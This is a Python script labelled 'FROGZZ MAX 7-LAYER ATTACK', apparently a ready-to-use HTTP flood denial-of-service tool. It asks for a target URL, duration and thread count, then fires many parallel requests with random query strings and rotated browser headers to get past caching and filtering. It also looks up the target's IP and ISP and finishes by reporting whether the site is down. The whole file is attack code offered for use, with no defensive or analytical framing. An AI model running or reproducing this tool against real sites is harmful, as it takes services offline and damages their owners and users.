import requests
import threading
import time
import random
import string
import socket
import os

RED = "\033[91m"
RESET = "\033[0m"

def random_query(length=5):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_headers():
    return {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Linux; Android 10)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
            "curl/7.68.0",
        ]),
        "Referer": "https://google.com",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Accept-Encoding": "gzip, deflate",
    }

def http_attack(url, duration, thread_id):
    end = time.time() + duration
    while time.time() < end:
        try:
            full_url = url + "?" + random_query()
            r = requests.get(full_url, headers=generate_headers(), timeout=3)
            print(f"[{thread_id}] Sent => {full_url} [{r.status_code}]")
        except:
            print(f"[{thread_id}] Timeout or failed request")
            continue

def get_target_info(url):
    host = url.split("://")[1].split(":/")[0]
    ip = socket.gethostbyname(host)
    try:
        isp = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json().get("isp", "Unknown")
    except:
        isp = "Unknown"
    return ip, isp

def check_status(url):
    try:
        r = requests.get(url, timeout=5)
        return "ON" if r.status_code == 200 else "DOWN"
    except:
        return "DOWN"

def main():
    os.system('clear')
    print(f"{RED}==== FROGZZ MAX 7-LAYER ATTACK ===={RESET}")
    url = input("Target URL (with http/https): ")
    duration = int(input("Duration (seconds): "))
    threads = int(input("Threads (recommend 50-100): "))

    ip, isp = get_target_info(url)
    print(f"{RED}Target IP : {ip} | ISP : {isp}{RESET}")

    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=http_attack, args=(url, duration, i+1))
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    status = check_status(url)
    print(f"\n{RED}Attack Finished")
    print(f"[IP : {ip}]")
    print(f"[ISP : {isp}]")
    print(f"[STATUS : {status}]{RESET}")

if __name__ == "__main__":
    main()